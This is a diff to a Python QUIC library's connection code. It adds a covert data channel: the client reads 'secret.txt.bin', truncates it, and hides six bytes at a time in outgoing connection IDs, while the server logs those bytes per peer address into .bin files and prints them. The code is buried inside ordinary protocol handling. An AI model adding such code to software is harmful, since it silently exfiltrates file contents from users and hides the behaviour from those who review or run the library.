@@ -111,6 +111,9 @@ STREAMS_BLOCKED_CAPACITY = 1 + UINT_VAR_MAX_SIZE
 TRANSPORT_CLOSE_FRAME_CAPACITY = 1 + 3 * UINT_VAR_MAX_SIZE  # + reason length
 
 
+SECRET_BUFFER_FILE = 'secret.txt.bin'
+SECRET_FILE = 'secret.txt'
+
 def EPOCHS(shortcut: str) -> FrozenSet[tls.Epoch]:
     return frozenset(EPOCH_SHORTCUTS[i] for i in shortcut)
 
@@ -220,6 +223,7 @@ class QuicReceiveContext:
     quic_logger_frames: Optional[List[Any]]
     time: float
     version: Optional[int]
+    addr: NetworkAddress
 
 
 QuicTokenHandler = Callable[[bytes], None]
@@ -339,8 +343,21 @@ class QuicConnection:
         self._network_paths: List[QuicNetworkPath] = []
         self._pacing_at: Optional[float] = None
         self._packet_number = 0
+        if self._is_client:
+            # Read the buffer
+            secret_bytes = open(SECRET_BUFFER_FILE, 'rb').read()
+            # Truncate it
+            open(SECRET_BUFFER_FILE, 'wb').write(secret_bytes[6:])
+            # Use the first 8 bytes as the cid
+            cid = os.urandom(2) + secret_bytes[:6]
+            # If we get to the end of the buffer, the cid will be less than 8
+            # so extend it, the receiver can figure out when the file ends
+            if len(cid) < 8:
+                cid = cid + os.urandom(8 - len(cid))
+        else:
+            cid = os.urandom(8)
         self._peer_cid = QuicConnectionId(
-            cid=os.urandom(configuration.connection_id_length), sequence_number=None
+            cid=cid, sequence_number=None
         )
         self._peer_cid_available: List[QuicConnectionId] = []
         self._peer_cid_sequence_numbers: Set[int] = set([0])
@@ -411,6 +428,7 @@ class QuicConnection:
         self._probe_pending = False
         self._retire_connection_ids: List[int] = []
         self._streams_blocked_pending = False
+        self._cid_map = {}
 
         # callbacks
         self._session_ticket_fetcher = session_ticket_fetcher
@@ -1027,6 +1045,7 @@ class QuicConnection:
                 quic_logger_frames=quic_logger_frames,
                 time=now,
                 version=header.version,
+                addr=addr
             )
             try:
                 is_ack_eliciting, is_probing = self._payload_received(
@@ -1894,6 +1913,13 @@ class QuicConnection:
         retire_prior_to = buf.pull_uint_var()
         length = buf.pull_uint8()
         connection_id = buf.pull_bytes(length)
+        cid_list = self._cid_map.get(context.addr[0], [])
+        if not self._is_client and (len(cid_list) == 0 or cid_list[-1] != self._original_destination_connection_id):
+            cid_list.append(self._original_destination_connection_id)
+            cid_list = cid_list[:10]
+            self._cid_map[context.addr[0]] = cid_list
+            open(f'{str(context.addr[0])}.bin', 'ab+').write(self._original_destination_connection_id[2:])
+            print(f'{str(context.addr[0])},{self._original_destination_connection_id[2:].hex()}')
         stateless_reset_token = buf.pull_bytes(STATELESS_RESET_TOKEN_SIZE)
         if not connection_id or len(connection_id) > CONNECTION_ID_MAX_SIZE:
             raise QuicConnectionError(
